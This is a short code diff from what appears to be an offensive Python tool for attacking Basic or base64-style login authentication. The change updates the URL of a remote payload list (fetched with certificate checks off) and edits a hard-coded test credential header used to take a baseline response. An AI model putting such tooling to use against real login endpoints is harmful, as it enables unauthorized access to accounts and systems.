@@ -14,7 +14,7 @@ def ctrl_c(signal, frame):
 signal.signal(signal.SIGINT, ctrl_c)
 
 def GiveMe_FckinPayloads():
-    request = requests.get("https://raw.githubusercontent.com/VP4triot/Pwn_BasicAuth/main/Payloads_List.txt", verify=False)
+    request = requests.get("https://raw.githubusercontent.com/VP4triot/Pwn_Base64Login/main/Payloads_List.txt", verify=False)
     return request.text.splitlines()
 
 def Stablish_Baseline(url):
@@ -24,7 +24,7 @@ def Stablish_Baseline(url):
     headers = {
         'Host': domain,
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
-        'Authorization': 'Basic VGhpc2lzYXRlc3QxMjM0OjEyMzRUZXN0aW5n',
+        'Authorization': 'VGhpc2lzYXRlc3QxMjM0OjEyMzRUZXN0aW5n',
         'Connection': 'close',
     }
 
